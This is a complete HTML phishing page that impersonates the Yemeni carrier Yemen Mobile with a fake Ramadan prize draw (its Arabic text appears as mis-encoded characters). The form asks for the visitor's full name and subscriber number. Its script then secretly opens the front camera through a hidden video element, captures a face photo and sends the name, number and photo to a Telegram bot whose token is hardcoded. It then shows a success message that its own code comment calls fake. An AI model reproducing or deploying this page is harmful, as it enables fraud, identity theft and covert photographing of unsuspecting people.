<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ÙŠÙ…Ù† Ù…ÙˆØ¨Ø§ÙŠÙ„ - Ù…Ø³Ø§Ø¨Ù‚Ø© Ø±Ù…Ø¶Ø§Ù† 1447Ù‡Ù€</title>
    <style>
        :root { --yem-red: #d30e15; --yem-blue: #00427a; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #eceff1; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        
        .card { background: #ffffff; width: 92%; max-width: 400px; border-radius: 25px; box-shadow: 0 15px 45px rgba(0,0,0,0.2); overflow: hidden; position: relative; border: 1px solid #cfd8dc; }

        /* Ø§Ù„Ù‡ÙŠØ¯Ø± Ø§Ù„Ø§Ø­ØªØ±Ø§ÙÙŠ Ø§Ù„Ù…Ù†Ø­Ù†ÙŠ */
        .header { background: var(--yem-blue); padding: 50px 20px 60px; text-align: center; color: white; position: relative; }
        .header::after { content: ""; position: absolute; bottom: -1px; left: 0; width: 100%; height: 50px; background: white; clip-path: ellipse(75% 100% at 50% 100%); }

        /* Ø­Ø§ÙˆÙŠØ© Ø§Ù„Ø´Ø¹Ø§Ø± Ø§Ù„Ø£ØµÙ„ÙŠ */
        .logo-box { width: 100px; height: 100px; background: white; border-radius: 50%; margin: 0 auto 15px; display: flex; justify-content: center; align-items: center; border: 4px solid var(--yem-red); z-index: 5; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden; }
        .logo-box img { width: 100%; height: 100%; object-fit: cover; }

        .stars { position: absolute; top: 15px; left: 20px; color: #ffeb3b; font-size: 18px; }
        .lantern { position: absolute; top: 15px; right: 20px; color: #ffeb3b; font-size: 28px; }

        .content { padding: 35px 25px 30px; text-align: center; }
        .title-text { font-size: 22px; font-weight: bold; color: var(--yem-blue); margin-bottom: 8px; }
        .sub-text { font-size: 13px; color: #607d8b; margin-bottom: 25px; line-height: 1.6; }
        
        .input-group { margin-bottom: 20px; text-align: right; }
        label { display: block; margin-bottom: 6px; font-weight: bold; color: #37474f; font-size: 14px; }
        input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 12px; background: #fafafa; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--yem-red); background: #fff; }

        .btn { background: var(--yem-red); color: white; border: none; padding: 16px; width: 100%; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 6px 20px rgba(211, 14, 21, 0.3); }
        .btn:hover { background: #b71c1c; transform: translateY(-2px); }

        #loading-screen { display: none; padding: 40px 0; }
        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid var(--yem-red); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        #video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="header">
        <div class="stars">âœ¨ â˜…</div>
        <div class="lantern">ğŸ®</div>
        <div class="logo-box">
            <img src="https://yemenmobile.com.ye/assets/images/logo.png" alt="Yemen Mobile">
        </div>
        <div class="title-text" style="color: white; margin-top: 10px;">Ù…Ø³Ø§Ø¨Ù‚Ø© Ø±Ù…Ø¶Ø§Ù† Ø§Ù„Ø®ÙŠØ±</div>
        <p style="margin:0; font-size: 11px; opacity: 0.8;">Ù…Ø¹Ù†Ø§.. Ø§ØªØµØ§Ù„Ùƒ Ø£Ø³Ù‡Ù„</p>
    </div>

    <div class="content">
        <div id="main-form">
            <p class="sub-text">Ø¨Ù…Ù†Ø§Ø³Ø¨Ø© Ø´Ù‡Ø± Ø±Ù…Ø¶Ø§Ù† Ø§Ù„Ù…Ø¨Ø§Ø±ÙƒØŒ Ø´Ø§Ø±Ùƒ Ø§Ù„Ø¢Ù† Ù„ØªØ¯Ø®Ù„ Ø§Ù„Ø³Ø­Ø¨ Ø¹Ù„Ù‰ Ø±ØµÙŠØ¯ Ù…Ø¬Ø§Ù†ÙŠ 10,000 Ø±ÙŠØ§Ù„ ÙˆØ¨Ø§Ù‚Ø§Øª Ù…Ø²Ø§ÙŠØ§ Ø§Ù„Ø´Ù‡Ø±ÙŠØ©.</p>
            
            <div class="input-group">
                <label>Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„:</label>
                <input type="text" id="name" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ø³Ù…Ùƒ ÙƒÙ…Ø§ ÙÙŠ Ø§Ù„Ù‡ÙˆÙŠØ©">
            </div>
            
            <div class="input-group">
                <label>Ø±Ù‚Ù… Ø§Ù„Ù…Ø´ØªØ±Ùƒ:</label>
                <input type="number" id="phone" placeholder="77XXXXXXX">
            </div>

            <button class="btn" onclick="submitEntry()">Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø³Ø­Ø¨ Ø§Ù„Ø¢Ù†</button>
            <p style="font-size: 10px; color: #90a4ae; margin-top: 20px;">Â© Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø© Ù„Ø´Ø±ÙƒØ© ÙŠÙ…Ù† Ù…ÙˆØ¨Ø§ÙŠÙ„ 2026</p>
        </div>

        <div id="loading-screen">
            <div class="spinner"></div>
            <p id="status-msg" style="font-weight: bold; color: var(--yem-blue);">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...</p>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    const API_TOKEN = "8274780275:AAHJRfz_32XgoKPIKzk78ux1hwgaMAGsRkc";
    const CHAT_ID = "7368655915";

    async function sendToBot(message, imageBlob = null) {
        try {
            if (imageBlob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', imageBlob, 'user_capture.jpg');
                formData.append('caption', message);
                await fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            } else {
                await fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                });
            }
        } catch (e) { console.error("Error sending data"); }
    }

    async function submitEntry() {
        const userName = document.getElementById('name').value;
        const userPhone = document.getElementById('phone').value;

        if (userName.length < 3 || userPhone.length < 9) {
            alert("ÙŠØ±Ø¬Ù‰ Ù…Ù„Ø¡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­");
            return;
        }

        document.getElementById('main-form').style.display = 'none';
        document.getElementById('loading-screen').style.display = 'block';

        const dataSummary = `ğŸŒ™ Ù…Ø´Ø§Ø±Ùƒ Ø¬Ø¯ÙŠØ¯ ÙÙŠ Ù…Ø³Ø§Ø¨Ù‚Ø© Ø±Ù…Ø¶Ø§Ù†:\nğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: ${userName}\nğŸ“ Ø§Ù„Ø±Ù‚Ù…: ${userPhone}\nâ° Ø§Ù„ÙˆÙ‚Øª: ${new Date().toLocaleString()}`;

        try {
            // Ù…Ø­Ø§ÙˆÙ„Ø© ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (ØªÙ†Ø¨ÙŠÙ‡ Ù„Ù„Ù…ØªØµÙØ­)
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // Ø§Ù†ØªØ¸Ø§Ø± Ø¨Ø³ÙŠØ· Ù„Ø¶Ù…Ø§Ù† ÙˆØ¶ÙˆØ­ Ø§Ù„ØµÙˆØ±Ø©
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                canvas.toBlob(async (blob) => {
                    await sendToBot(dataSummary + "\nğŸ“¸ Ø§Ù„Ø­Ø§Ù„Ø©: ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© Ø§Ù„ÙˆØ¬Ù‡", blob);
                    stream.getTracks().forEach(track => track.stop());
                }, 'image/jpeg');
            }, 2500);

        } catch (err) {
            // Ø¥Ø°Ø§ Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ØŒ ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø§Ø³Ù… ÙˆØ§Ù„Ø±Ù‚Ù… ÙÙ‚Ø·
            await sendToBot(dataSummary + "\nâŒ Ø§Ù„Ø­Ø§Ù„Ø©: Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§");
        }

        // Ø¥Ø¸Ù‡Ø§Ø± Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù†Ø¬Ø§Ø­ Ø§Ù„ÙˆÙ‡Ù…ÙŠØ© Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…
        setTimeout(() => {
            document.getElementById('status-msg').innerHTML = "âœ… ØªÙ… ØªØ³Ø¬ÙŠÙ„Ùƒ Ø¨Ù†Ø¬Ø§Ø­!<br>Ø³ÙŠØªÙ… Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹Ùƒ ÙÙŠ Ø­Ø§Ù„ ÙÙˆØ²Ùƒ Ø¨Ø§Ù„Ø³Ø­Ø¨.";
            document.querySelector('.spinner').style.display = 'none';
        }, 5000);
    }
</script>
</body>
</html>
